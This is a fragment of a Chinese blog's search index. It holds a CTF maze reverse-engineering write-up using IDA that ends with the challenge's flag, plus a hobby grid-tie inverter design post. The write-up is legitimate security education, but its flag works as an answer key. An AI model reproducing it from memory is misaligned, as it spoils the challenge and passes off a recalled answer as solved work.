+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/dbR5oWmq.png"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一个迷宫类CTF题的分析</title>
+    <url>/2023/08/26/%E4%B8%80%E4%B8%AA%E8%BF%B7%E5%AE%AB%E7%B1%BBCTF%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是CTF"><a href="#什么是CTF" class="headerlink" title="什么是CTF"></a>什么是CTF</h2><p>Capture The Flag的简称为CTF，这是计算机安全领域的一种比赛形式，产生于黑客社区。在CTF比赛中，参赛者通常会被分为两队，需要解决一系列和计算机安全相关的问题，并试图攻击对方的系统，同时保护自己的系统不被对方攻击。</p>
+<h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>操作系统：win10</p>
+<p>逆向工具：010editor，ida pro7.0(随便哪个版本都能用)</p>
+<p>题目：maze</p>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="1-收集文件信息"><a href="#1-收集文件信息" class="headerlink" title="1. 收集文件信息"></a>1. 收集文件信息</h2><p><strong>1.1 使用010editor查看文件类型</strong></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/JqcHVaKo.png"
+                      style="zoom: 25%;" 
+                >
+
+<p>不难看出，这是是linux下的一个ELF文件，由于使用的系统环境为Windows，所以只能静态分析😭</p>
+<p><strong>1.2 确定是否需要脱壳</strong></p>
+<p>一般linux下的文件最多加个UPX壳，所以直接搜索UPX字符串，不过搜不到，盲猜没加</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/dF1FTS9b.png"
+                      style="zoom:50%;" 
+                >
+
+<p><strong>1.3 看一看能否找到明码的flag</strong></p>
+<p>由于是CTF题，那么接下来开始三板斧</p>
+<p>直接搜一下flag字符串，看看静态文件中是否存在，果然不出所料————不存在</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/X1EUSCM2.png"
+                      style="zoom:50%;" 
+                >
+
+<h2 id="2-明确分析思路"><a href="#2-明确分析思路" class="headerlink" title="2. 明确分析思路"></a>2. 明确分析思路</h2><p>这里用的是静态分析，所以接下来应该</p>
+<ol>
+<li><strong>寻找输入</strong></li>
+<li><strong>寻找关键字符串</strong></li>
+<li><strong>定位关键验证逻辑</strong></li>
+<li><strong>分析关键验证逻辑</strong>，理清思路</li>
+<li><strong>模拟运行</strong>或<strong>直接调试</strong>(but没有搭环境，pass)运行得到flag</li>
+</ol>
+<h2 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h2><p>将这一坨东西拖入IDA（要点时间，可以先去看会儿新闻联播，等它慢慢跑完，）</p>
+<p>加载完成后，可以看到IDA解析出来的函数，顺带很贴心的帮分析出了main函数。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/u39Y9eLJ.png"
+                      style="zoom:50%;" 
+                >
+
+<p>双击进入main函数，看到如下一堆函数逻辑。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/DmKcWnCi.png"
+                      style="zoom: 25%;" 
+                >
+
+<p>看起来所有功能都放main函数中了，甚至还找到了一些注册成功的输出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/278dlG4H.png"
+                      style="zoom: 25%;" 
+                >
+
+<p>与此同时邻居家上小学一年级的小弟弟看到这里发现了解决办法，接下来只要直接改跳转，让其跳转到Congratulations！就可以了吧！当然不行。所谓逆向，就是要分析出写程序人的意图，然后让他明白，不管怎么搞，都能还原成原始代码，还要弄炸他的心态，直接写注册码。</p>
+<p><strong>辅助工具，开整！</strong></p>
+<p>由于不想动态调试，加上程序逻辑清晰,并没有加一些花里胡哨的东西(例如花指令)，这里就使用了IDA的灵魂，<strong>F5，一键还原伪代码。</strong></p>
+<p>在main函数中直接F5，就能看到这段逻辑的伪码啦。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/DH759pr2.png"
+                      style="zoom: 33%;" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/FDWioynC.png"
+                      style="zoom: 50%;" 
+                >
+
+<p><strong>修改伪码</strong></p>
+<p>首先，对代码进行小小的整容外加修改(一系列的变量替换，函数名称替换，变量格式更改)，使其更加符合我们的编程习惯。 </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/qBJ3IUcg.png"
+                      style="zoom: 33%;" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/oXeuqncK.png"
+                      style="zoom: 25%;" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/KuGELRBW.png"
+                      style="zoom: 33%;" 
+                >
+
+<p><strong>分析源码</strong><br>​     可以看出，该代码是输入<strong>nctf{xxxxx}(<strong>共24位)中的</strong>x</strong>来对内存中的<strong>x</strong>，<strong>y</strong>进行一系列的运算，用算完后的<strong>x</strong>，<strong>y</strong>在数组<strong>mazeBuffer</strong>中定位到一个值，如果这个值为**#<strong>，则输出成功，否则输出失败。那</strong>mazeBuffer<strong>是一个什么东西呢？只需要 双击</strong>mazeBuffe**r，看到它在数据段中的值</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/vTAdsj5Y.png"
+                      style="zoom:67%;" 
+                >
+
+<p>这样看起来并不直观，根据它的长度(64)，以及最后的二维数组运算**(mazeBuffer[8 * nPosY + nPosX])<strong>，我们可以大胆推断它就是一个8*8 &#x3D; 64大小的二维数组。在数据区域使用</strong>IDA的另一个小功能微调<strong>，首先按</strong>d**转换为data模式，然后在标签名右键，array，选择如下设置</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/BiQZrd1J.png"
+                      style="zoom:50%;" 
+                >
+
+<p>得到一组不太直观的二维数组，再按一下r键，让它以ascii显示。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/08/26/9QUpq90B.png"
+                      style="zoom: 33%;" 
+                >
+
+<p><strong>为什么每一次操作，x，y都会变化呢？最后检查的为什么是#呢？x，y的初始值为什么是0，0呢？</strong></p>
+<p>答案如下：</p>
+<p>这个<strong>mazeBuffer</strong>是一个游戏迷宫地图，之前分析出来的4个操作性字符(对x，y的值有影响的)分别对应左右上下，也就是会循环读取输入的操作性字符，然后让我们从上图的地图中虚拟移动。</p>
+<p>综上，得到了这个flag的终极解法。<strong>构造一条能从(0,0)点到达#位置的路径</strong>，只能走上图的空白处。大概就是**nctf{右下右右下下左下下下右右右右上上左左}**，数一数，刚好24个字，然后打开文本编辑器，将上下左右替换成对应的编码(上 &#x3D;&#x3D;&gt;.  下&#x3D;&#x3D;&gt;0 左&#x3D;&#x3D;&gt;O 右&#x3D;&#x3D;&gt;o)</p>
+<p>至此，得到了<strong>最终的flag ：nctf{o0oo00O000oooo..OO}</strong></p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1>
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>总结</p>
+
+    </div>
+    <div class="notel-content">
+      <p>1.不要有畏惧心理，再难的程序也有被破解的一天，任何系统的程序只要能被反编译，就能被分析</p>
+<p>2.要善于使用工具，很多功能IDA啊，OD啊，或者xdbg会给我们提供，工具玩的好，逆向也会更加省时省力   </p>
+<p>3.不要局限于破解，分析算法才是逆向的灵魂所在，就像我们今天走完的这段旅途，风景不也很美好么</p>
+
+    </div>
+  </div>
+
+]]></content>
+      <tags>
+        <tag>软件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简易并网逆变器设计</title>
+    <url>/2023/07/03/%E7%AE%80%E6%98%93%E5%B9%B6%E7%BD%91%E9%80%86%E5%8F%98%E5%99%A8%E8%AE%BE%E8%AE%A1/</url>
+    <content><![CDATA[<h1 id="并网逆变器的工作原理"><a href="#并网逆变器的工作原理" class="headerlink" title="并网逆变器的工作原理"></a>并网逆变器的工作原理</h1><p>并网逆变器的工作原理是产生与电网具有<strong>相同相位和频率</strong>但<strong>幅度稍高</strong>的波形，以驱动正向电流。这可以使用 2 个半桥和滤波电路来完成，每个半桥都作为同步降压转换器工作，其滤波后的输出电压与 PWM 占空比成正比。通过以正弦方式改变占空比，在滤波后可以得到正弦输出电压。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/tXE3aKoq.png"
+                     
+                ></p>
+<p>半桥只能产生相对于地的正电压。如果每个半桥轮流扫出半个周期，那么差分信号将是完整的正弦波。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/Q3xwBrEI.png"
+                     
+                ></p>
+<h1 id="设计过程"><a href="#设计过程" class="headerlink" title="设计过程"></a>设计过程</h1><p>使用一个 12v 至 380v DC&#x2F;DC 转换器模块。它会产生约 21KHz 频率的方波电压输出给变压器。然后在变压器的输出上就会得到相同频率的方波，变压器的输出电压会按匝数比放大。根据模块的接口，可以获得 220 或 380V 电压。<code>(输出电压实际上取决于输入电压和变压器匝数比，如果输入电压为 10V，则在 220V 抽头上会得到 186V 电压，而在 15V 输入电压下，会得到 280V 电压)</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/dlDwSh5z.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/y7XZTF1Y.png"
+                     
+                ></p>
+<p>输入电压为 10V、使用 500x 探头 (21kHz) 时 220V 分接头上的波形如下：</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/9FXmWKNb.png"
+                      alt="输入电压为 10V、使用 500x 探头 (21kHz) 时 220V 分接头上的波形"
+                ><figcaption>输入电压为 10V、使用 500x 探头 (21kHz) 时 220V 分接头上的波形</figcaption></figure></p>
+<p>电路的输出需要全桥整流器转换为直流电压。这里使用了 600V 的快速二极管。变压器模块还提供隔离的 18V 绕组，在调节至 12V 和 3.3V 后，可以用于主逆变器板上的栅极驱动和逻辑电源。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/J4HGXrBQ.png"
+                     
+                ></p>
+<p><strong>总的来说，这些电路可以产生需要的高压直流总线和独立的 12V 驱动电源</strong></p>
+<p>接下来设计组装了一个 PCB，其中包含 H 桥、MOSFET 驱动器、霍尔效应电流感应、一些分压器和 LC 输出滤波器。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/SEAd3Ny3.png"
+                     
+                ></p>
+<p><strong>同步电路</strong>：部分为一个锁相环 (PLL) 它负责同步到电网。</p>
+<p><strong>采样电路</strong>：对输出电流进行采样，使用 64-FFT 来测量 谐波的相位和幅度。</p>
+<p><strong>谐波抑制电路</strong>：通过PI 控制器为每个频率注入逆谐波以将其抵消。</p>
+<p>上面的三个基本电路能够实现输出电流的低失真水平。基波的相位和幅度可以不断调整 用来驱动所需的输出电流并最大限度地减少无功分量。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/Lxf9ADt4.png"
+                     
+                ></p>
+<p>电路会生成 大约240V 信号并直接馈入电网。这个电路的变压器负责提供一点缓冲和隔离。同时在变压器闲置时会消耗 约<strong>10W</strong> 的功率。</p>
+<p>这是一个<strong>简易的学习电路</strong>，它有严重的效率损失<em><strong>只适合了解逆变器的工作原理并不适合实际中使用。</strong></em></p>
+<h1 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h1><h2 id="PCB-布局"><a href="#PCB-布局" class="headerlink" title="PCB 布局"></a>PCB 布局</h2><p>最初想不要输出变压器，所以将直流总线电压提高到约 380V，以便可以直接合成 240V 交流波形。当增加总线电压时，电磁干扰 (EMI) 成为一个大问题。它完全破坏了电流感应，并且示波器上出现了巨大的干扰尖峰。<strong>PCB 布局设计变得与原理图本身一样重要。</strong></p>
+<h3 id="更好地利用地线层"><a href="#更好地利用地线层" class="headerlink" title="更好地利用地线层"></a>更好地利用地线层</h3><p>地线布局和设计对于抑制 <code>EMI</code> 至关重要。最初，我认为最好不要在<code>开关节点</code>下方有<code>接地层</code>，因为任何接地电容肯定会在每次电压转换期间产生<strong>能量损失</strong>。然而事实证明<code>1.6mm</code> <code>2 层板</code>中 <code>接地层</code> 正上方的 <code>1cm²</code> PCB 走线仅呈现 3pF 的电容。在 40kHz 下将 3pF 充电至 400V 使用了 10mW的功率。<strong>能量损失微不足道</strong>。相反，将<code>接地层</code>放置在开关节点下方可显着降低 <code>EMI</code>。</p>
+<h3 id="将-LC-输出滤波器放置在靠近开关节点的位置"><a href="#将-LC-输出滤波器放置在靠近开关节点的位置" class="headerlink" title="将 LC 输出滤波器放置在靠近开关节点的位置"></a>将 LC 输出滤波器放置在靠近开关节点的位置</h3><p>开关节点直接馈入板载 LC 滤波器，走线尽可能短并位于地线层上方。我相信这可以最大限度地减少发射的 EMI。</p>
+<h3 id="LC-输出滤波电容以地为参考"><a href="#LC-输出滤波电容以地为参考" class="headerlink" title="LC 输出滤波电容以地为参考"></a>LC 输出滤波电容以地为参考</h3><p>一直不太确定输出滤波器的设计。不过商用逆变器似乎都采用 LCL 滤波器，找到的一些资料里</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/nmdvESWP.png"
+                     
+                ></p>
+<ol>
+<li>最简单的，然而负载右侧的导线上将传输快速切换的瞬态电流而且表现的像天线一样。</li>
+<li>通过添加另一个电感来解决这个问题，但要减少电磁辐射，实际需要的是接地端电容器，而不是负载上的电容器。</li>
+<li>解决了2的问题：通过C1和C2与电感器一起过滤掉尖锐的切换瞬态就可以控制电磁辐射。然而需要两个大电感器和两个大电容器。</li>
+<li>在电容器上节省了一些费用。C5和C6的值较小，仅用于消除高速切换过程中的瞬时波动。而C4实际上使输出波形变得平滑。</li>
+<li>进一步节省电感器上的费用。L9&#x2F;L10、C9&#x2F;C10的值较小，仅用于电磁干扰过滤。在它们的输出端仍然会有方波，不过这些方波的变化过程更为平缓，这样导线就不会像天线一样工作。这些组件尺寸更小，价格更便宜。然后只需要一个大型L和C（L11和C6）来使波形平滑成正弦波。</li>
+</ol>
+<p>我使用了布局 4。主要区别在于每个 LC 输出滤波器都以地为参考。这就允许 41kHz 纹波电流 流过 接地电容并直接返回直流总线。减少了电流环路的面积，从而降低了 EMI。</p>
+<h3 id="关于纹波电流的思考"><a href="#关于纹波电流的思考" class="headerlink" title="关于纹波电流的思考"></a>关于纹波电流的思考</h3><p>对于像这样的开关电源有一个一般的经验法则。规则是峰峰值纹波电流为最大输出电流的 20-30%。所以，假设峰值输出电流为 2A，我们的纹波电流目标应该在 0.4-0.6A 之间</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/02MiKkhx.png"
+                     
+                ></p>
+<p><strong>正弦波不同部分的 PWM 占空比不同</strong>，纹波电流取决于占空比，占空比为 50% 时纹波最大。在交流波形的峰值处，占空比不会是 50%。240Vrms 正弦波峰值为 340V，这需要占空比 D &#x3D; Vout&#x2F;Vin &#x3D; 340&#x2F;380 &#x3D; 90%，设计的开关频率为 41kHz。当母线电压为 380V 时，输出电压 340V 时通过 2mH 电感的纹波电流将为 0.44A。<a class="link"   href="https://www.ti.com/lit/an/slva477b/slva477b.pdf?ts=1662800047365&ref_url=https://www.google.co.uk/" >TI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>有一篇出色的文章描述了所有这些计算，这里有一个<a class="link"   href="https://calculator.academy/ripple-current-calculator/#f1p1|f2p0" >在线纹波电流计算器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。在 2A 峰值输出电流下，纹波为 22%。找到合适的电感并确定为 2mH。</p>
+<p><strong>选择电感器</strong>时，考虑纹波电流非常重要。纹波电流叠加在峰值输出电流上。电感器不得饱和。</p>
+<h3 id="使用环形电感器"><a href="#使用环形电感器" class="headerlink" title="使用环形电感器"></a>使用环形电感器</h3><p>环形线圈可以更好地将磁通量限制在其内部，并且不会辐射磁通量。</p>
+<h1 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h1><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/03/wFilECkm.png"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>硬件</tag>
+      </tags>
   </entry>
 </search>
